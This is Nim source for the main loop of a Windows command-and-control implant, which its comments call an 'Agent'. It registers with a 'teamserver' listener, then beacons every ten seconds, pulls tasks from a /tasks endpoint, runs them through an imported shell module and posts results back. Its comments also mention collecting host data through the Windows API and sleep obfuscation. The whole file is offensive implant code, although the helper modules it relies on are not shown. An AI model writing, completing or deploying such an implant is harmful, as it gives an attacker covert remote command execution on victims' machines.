import strformat, os, times
import winim

import ./[types, http]
import commands/shell

proc main() = 

    #[
        The process is the following:
        1. Agent reads configuration file, which contains data relevant to the listener, such as IP, PORT, UUID and sleep settings
        2. Agent collects information relevant for the registration (using Windows API)
        3. Agent registers to the teamserver 
        4. Agent moves into an infinite loop, which is only exited when the agent is tasked to terminate
    ]#  

    let listener = "NVIACCXB"
    let agent = register(listener)
    echo fmt"[+] [{agent}] Agent registered."

    #[
        Infinite Routine: 
        1. Sleep Obfuscation
        2. Retrieve task from /tasks endpoint
        3. Execute task and post result to /results
        4. If additional tasks have been fetched, go to 2.
        5. If no more tasks need to be executed, go to 1. 
    ]#
    while true: 

        sleep(10 * 1000)

        let date: string = now().format("dd-MM-yyyy HH:mm:ss")
        echo fmt"[{date}] Checking for tasks..."

        discard getTasks(listener, agent)


when isMainModule: 
    main() 